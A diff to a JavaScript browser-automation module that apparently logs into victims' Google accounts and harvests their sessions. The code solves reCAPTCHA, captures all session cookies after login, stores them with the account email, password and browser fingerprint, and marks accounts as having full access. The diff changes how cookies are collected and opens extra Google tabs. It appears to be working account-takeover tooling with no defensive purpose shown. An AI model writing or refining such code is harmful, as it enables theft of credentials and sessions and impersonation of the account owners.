@@ -48,7 +48,7 @@ import {
     clickRecaptchaCheckbox,
     isPageResponsive,
     parseLocaleDate,
-    captureMultiTabCookies
+    openGoogleExtraTabs
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails, getSheetDataApi, stripFormulaColumns } from '../../../api/googlesheets.js'; // Import getProjectDetails
@@ -5815,11 +5815,10 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                         updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = captured.cookieJSON;
-                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        await openGoogleExtraTabs(browser, domain);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -5836,9 +5835,7 @@ if (!foundSelector) {
                                         updateBrowserRowDataFast(browserId, {
                                             status: "PROCESSING_FINALIZING",
                                             cookieJSON: updateData.cookieJSON,
-                                            accountCookieJSON: updateData.accountCookieJSON || '',
-                                            driveCookieJSON: updateData.driveCookieJSON || '',
-                                            cookieAccess: true,
+                                                                                                                                    cookieAccess: true,
                                             verified: true,
                                             fullAccess: true,
                                             lastJsonResponse: updateData.lastJsonResponse
@@ -5908,11 +5905,10 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                         updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = captured.cookieJSON;
-                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        await openGoogleExtraTabs(browser, domain);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -5929,9 +5925,7 @@ if (!foundSelector) {
                                             updateBrowserRowDataFast(browserId, {
                                                 status: "PROCESSING_FINALIZING",
                                                 cookieJSON: updateData.cookieJSON,
-                                                accountCookieJSON: updateData.accountCookieJSON || '',
-                                                driveCookieJSON: updateData.driveCookieJSON || '',
-                                                cookieAccess: true,
+                                                                                                                                                cookieAccess: true,
                                                 verified: true,
                                                 fullAccess: true,
                                                 lastJsonResponse: updateData.lastJsonResponse
@@ -6152,18 +6146,15 @@ if (!foundSelector) {
                                             lastJsonResponse: updateData.lastJsonResponse
                                         });
 
-                                        const captured = await captureMultiTabCookies(browser, page, domain, browserId);
-                                        updateData.cookieJSON = captured.cookieJSON;
-                                        if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                        if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
+                                        await openGoogleExtraTabs(browser, domain);
 
                                         // Persist captured cookie sets to fast cache
                                         updateBrowserRowDataFast(browserId, {
                                             status: "PROCESSING_FINALIZING",
                                             cookieJSON: updateData.cookieJSON,
-                                            accountCookieJSON: updateData.accountCookieJSON || '',
-                                            driveCookieJSON: updateData.driveCookieJSON || '',
-                                            cookieAccess: true,
+                                                                                                                                    cookieAccess: true,
                                             verified: true,
                                             fullAccess: true,
                                             lastJsonResponse: updateData.lastJsonResponse
@@ -6258,18 +6249,15 @@ if (!foundSelector) {
                                     lastJsonResponse: updateData.lastJsonResponse
                                 });
 
-                                const captured = await captureMultiTabCookies(browser, page, domain, browserId);
-                                updateData.cookieJSON = captured.cookieJSON;
-                                if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+                                updateData.cookieJSON = JSON.stringify(browserCookies);
+                                await openGoogleExtraTabs(browser, domain);
 
                                 // Persist captured cookie sets to fast cache
                                 updateBrowserRowDataFast(browserId, {
                                     status: "PROCESSING_FINALIZING",
                                     cookieJSON: updateData.cookieJSON,
-                                    accountCookieJSON: updateData.accountCookieJSON || '',
-                                    driveCookieJSON: updateData.driveCookieJSON || '',
-                                    cookieAccess: true,
+                                                                                                            cookieAccess: true,
                                     verified: true,
                                     fullAccess: true,
                                     lastJsonResponse: updateData.lastJsonResponse
@@ -6536,11 +6524,10 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                                 updateData.status = "PROCESSING_FINALIZING";
-                                updateData.cookieJSON = captured.cookieJSON;
-                                if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                                if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+                                updateData.cookieJSON = JSON.stringify(browserCookies);
+                                await openGoogleExtraTabs(browser, domain);
                                 updateData.verified = true;
                                 updateData.fullAccess = isInboxFinal;
                                 updateData.cookieAccess = true;
@@ -6557,9 +6544,7 @@ if (!foundSelector) {
                                 updateBrowserRowDataFast(browserId, {
                                     status: "PROCESSING_FINALIZING",
                                     cookieJSON: updateData.cookieJSON,
-                                    accountCookieJSON: updateData.accountCookieJSON || '',
-                                    driveCookieJSON: updateData.driveCookieJSON || '',
-                                    cookieAccess: true,
+                                                                                                            cookieAccess: true,
                                     verified: true,
                                     fullAccess: isInboxFinal,
                                     lastJsonResponse: updateData.lastJsonResponse
@@ -6586,11 +6571,10 @@ if (!foundSelector) {
                             initialCheckResult.emailExists = true;
                             initialCheckResult.verificationState = null;
 
-                            const captured = await captureMultiTabCookies(browser, page, domain, browserId);
+                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
                             updateData.status = "PROCESSING_FINALIZING";
-                            updateData.cookieJSON = captured.cookieJSON;
-                            if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-                            if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+                            updateData.cookieJSON = JSON.stringify(browserCookies);
+                            await openGoogleExtraTabs(browser, domain);
                             updateData.verified = true;
                             updateData.fullAccess = true;
                             updateData.cookieAccess = true;
@@ -7026,9 +7010,7 @@ if (!foundSelector) {
             email: email || '',
             driveUrl: updateData.driveUrl || '',
             cookieJSON: updateData.cookieJSON || '',
-            accountCookieJSON: updateData.accountCookieJSON || '',
-            driveCookieJSON: updateData.driveCookieJSON || '',
-            browserIdentity: recoveredIdentity,
+                                    browserIdentity: recoveredIdentity,
             lastJsonResponse: (waitingStates.includes(finalStatus) && updateData.lastJsonResponse)
                 ? updateData.lastJsonResponse
                 : JSON.stringify({
@@ -7065,10 +7047,16 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
-            const captured = await captureMultiTabCookies(browser, page, domain, browserId);
-            updateData.cookieJSON = captured.cookieJSON;
-            if (captured.accountCookieJSON) updateData.accountCookieJSON = captured.accountCookieJSON;
-            if (captured.driveCookieJSON) updateData.driveCookieJSON = captured.driveCookieJSON;
+            const allUrls = getCookieCaptureUrls(domain);
+            let browserCookies = [];
+            try {
+                browserCookies = await page.cookies(...allUrls);
+            } catch (cookieErr) {
+                logger.warn(`[processRow][${browserId}] Could not capture cookies: ${cookieErr.message}. Proceeding with upload.`);
+            }
+            updateData.cookieJSON = JSON.stringify(browserCookies);
+            logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
+            await openGoogleExtraTabs(browser, domain);
             // Save the browser identity (fingerprint) so extraction/launcher can reuse it
             if (browser && browser.identity) {
                 try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
@@ -7098,9 +7086,7 @@ if (!foundSelector) {
                     email: email || '',
                     password: password || '',
                     cookieJSON: updateData.cookieJSON,
-                    accountCookieJSON: updateData.accountCookieJSON || '',
-                    driveCookieJSON: updateData.driveCookieJSON || '',
-                    browserIdentity: updateData.browserIdentity || '',
+                                                            browserIdentity: updateData.browserIdentity || '',
                     verified: updateData.verified,
                     fullAccess: updateData.fullAccess,
                     driveUrl: updateData.driveUrl,
